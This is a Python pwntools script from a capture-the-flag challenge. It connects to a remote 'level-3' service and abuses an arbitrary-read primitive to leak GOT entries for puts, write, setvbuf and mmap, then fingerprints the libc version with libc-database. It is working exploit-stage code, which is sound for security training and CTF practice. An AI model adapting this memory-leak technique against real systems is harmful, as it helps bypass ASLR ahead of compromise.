#!/usr/bin/env python

USAGE = """
# make sure to uncomment, the target you would like to do a libc analysis
# for.  By default we will use the remote target
$ ./identify-libc.py
[+] Opening connection to ctf.reversing.io on port 32103: Done
executable_object: 0x55e32b4e8030
level3_base: 0x55e32b2e7000
write 140 mmap 9d0 setvbuf 2f0 puts 9c0
[*] Closed connection to ctf.reversing.io port 32103
vagrant@debian-9:/vagrant/level-3$ ~/libc-database/find write 140 mmap 9d0 setvbuf 2f0 puts 9c0
http://ftp.osuosl.org/pub/ubuntu/pool/main/g/glibc/libc6_2.27-3ubuntu1_amd64.deb (id libc6_2.27-3ubuntu1_amd64)

Now, that you have id'd a libc, you can use with the libc db tool to
get offsets for any symbol in libc.  IE:
$ ~/libc-database/dump libc6_2.27-3ubuntu1_amd64 environ
offset_environ = 0x00000000003ee098
"""

from pwn import *

# level 3 program image offsets
executable_buffer_ptr_offset = 0x201030
# these are manually hard coded by doing an objdump -Mintel -d level-3
# and search for these symbols in the plt section
#    0000000000000760 <puts@plt>:
#         760:   ff 25 32 08 20 00       jmp    QWORD PTR [rip+0x200832]        # 200f98 <puts@GLIBC_2.2.5>
#          766:   68 00 00 00 00          push   0x0
#           76b:   e9 e0 ff ff ff          jmp    750 <.plt>
got_offsets = {
    "puts": 0x200f98,
    "write": 0x200fa0,
    "setvbuf": 0x200fd0,
    "mmap": 0x200fb0
}

# XXX: uncomment this to test out the tool locally, but in general, it's
#      not useful to run on a local binary because you can find symbols
#      yourself with a combination of nm, readelf, and objdump
# endpoint = process("level-3")
endpoint = remote("ctf.reversing.io", 32103)

endpoint.recvuntil("Have a pointer: ")
executable_buffer_ptr = int(endpoint.recvline().strip(), 16)
stdin_ptr = executable_buffer_ptr - 16

# get the base address of level3 because it is relro
level3_base = executable_buffer_ptr - executable_buffer_ptr_offset

print("executable_object: 0x{:x}".format(executable_buffer_ptr))
print("level3_base: 0x{:x}".format(level3_base))

u64 = make_unpacker(64, endian='little', sign='unsigned')

def finish():
    buf = p8(4)
    endpoint.send(buf)

def read_byte(address):
    buf = p8(2)
    buf += p64(address)
    endpoint.send(buf)
    return ord(endpoint.recv(1))

def read_bytes(addr, length):
    my_bytes = [chr(read_byte(i)) for i in range(addr, addr + length)]
    return "".join(my_bytes)

def read_ptr(addr):
    return u64(read_bytes(addr, 8))

def chunks(l, n):
    """Yield successive n-sized chunks from l."""
    for i in range(0, len(l), n):
        yield l[i:i + n]

def get_pointers(iter):
    return map(u64, list(chunks(iter, 8)))

if __name__ == "__main__":

    for function_name, got_offset in got_offsets.iteritems():
        
        function_address = read_ptr(level3_base + got_offset)
        function_address &= 0xfff
        print("{} {:x}".format(function_name, function_address)),

    finish()
